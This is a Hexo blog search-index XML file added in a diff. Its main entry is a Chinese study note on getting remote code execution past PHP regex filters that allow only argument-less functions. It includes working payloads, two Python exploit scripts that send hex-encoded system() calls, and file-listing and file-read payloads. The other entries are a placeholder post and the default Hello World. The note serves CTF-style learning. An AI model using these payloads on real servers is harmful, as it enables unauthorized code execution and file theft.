@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>无参数RCE和无字母webshell</title>
+      <link href="/2019/07/11/wu-can-shu-rce-he-wu-zi-mu-webshell/"/>
+      <url>/2019/07/11/wu-can-shu-rce-he-wu-zi-mu-webshell/</url>
+      
+        <content type="html"><![CDATA[<h1 id="无参数RCE和无字母webshell"><a href="#无参数RCE和无字母webshell" class="headerlink" title="无参数RCE和无字母webshell"></a>无参数RCE和无字母webshell</h1><p>看了飘零师傅和p牛的博客做一些笔记</p><h2 id="无参数函数RCE"><a href="#无参数函数RCE" class="headerlink" title="无参数函数RCE"></a>无参数函数RCE</h2><p><code>eval($_GET[&#39;code]&#39;)</code>;即可getshell</p><p>如果存在正则限制</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>即只可执行无参数的函数<br>允许</p><pre><code>a(b(c()))a()</code></pre><p>不允许<br><code>a(&#39;1&#39;)</code></p><h2 id="绕过方法一"><a href="#绕过方法一" class="headerlink" title="绕过方法一"></a>绕过方法一</h2><p>利用<code>getenv</code>方法</p><ol><li>使用<code>getenv</code>方法可以返回所有的环境变量，等同于$_ENV，是一个数组；</li><li>使用<code>array_rand</code>方法返回数组中随机一个键；</li><li>使用<code>array_flip</code>方法将数组的键值调换，正常返回需要的数值</li><li>爆破，返回所有数据<br>payload <code>?cmd=var_dump(array_rand(array_flip(getenv())));</code></li></ol><h2 id="绕过方法二"><a href="#绕过方法二" class="headerlink" title="绕过方法二"></a>绕过方法二</h2><p>利用<code>getallheaders</code>方法</p><p>使用场景 ，中间件是<code>apache</code></p><ol><li><code>getallheaders</code>方法返回包含当前请求所有头信息的数组；</li><li><code>end</code>方法返回数组最后一条；</li></ol><p>payload <code>?cmd=eval(end(getallheaders()));</code><br><img src="_v_images/20190409205646814_4640.png" alt></p><h2 id="绕过方法三"><a href="#绕过方法三" class="headerlink" title="绕过方法三"></a>绕过方法三</h2><p>使用 <code>get_defined_vars</code>方法</p><p><code>get_defined_vars</code>方法返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>数组</p><ol><li>使用<code>current</code>方法返回新添加的数据</li><li>同样利用方法二的方式来达到RCE</li></ol><p>碰到禁用了<code>$_GET,$_POST,$_COOKIE</code>时可以使用<code>$_FILES</code>，使用脚本来达到RCE</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOpayload <span class="token operator">=</span> <span class="token string">"system('ls /tmp');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">{</span>  payload<span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'hahaha'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content</code></pre><h2 id="绕过方法四"><a href="#绕过方法四" class="headerlink" title="绕过方法四"></a>绕过方法四</h2><p>使用session绕过<br>通过<code>session_id()</code>返回<code>session id</code><br>通过hex编码来写入payload既符合<code>PHPSESSID</code>的规范</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://localhost/test.php?code=eval(hex2bin(session_id(session_start())));'</span>payload <span class="token operator">=</span> <span class="token string">"system('ls ./');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content</code></pre><h2 id="绕过方法五"><a href="#绕过方法五" class="headerlink" title="绕过方法五"></a>绕过方法五</h2><p>使用<code>dirname()</code> &amp; <code>chdir()</code>直接读取文件</p><p>用到的函数<br><code>getcwd()</code>  获取当前目录<br><code>dirname()</code> 返回路径中的目录部分<br><code>chdir()</code> 改变目录<br><code>scandir()</code> 列出指定路径中的文件和目录<br>这几个函数配合使用即可达到目录遍历效果</p><p>payload<br>遍历当前目录 <code>?code=var_dump(scandir(getcwd()));</code><br>遍历上级目录<code>?code=var_dump(scandir(dirname(getcwd())));</code><br>读取文件 <code>?code=readfile(next(array_reverse(scandir(getcwd()))))</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Markdown </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2019/07/11/hai/"/>
+      <url>/2019/07/11/hai/</url>
+      
+        <content type="html"><![CDATA[<p>123123</p><p>##123123</p><p>#12312</p><pre class=" language-php"><code class="language-php"><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"hello world"</span><span class="token punctuation">;</span></code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// foo is a Number now</span><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token string">"bar"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// foo is a String now</span><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// foo is a Boolean now</span></code></pre>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2019/07/11/hello-world/"/>
+      <url>/2019/07/11/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
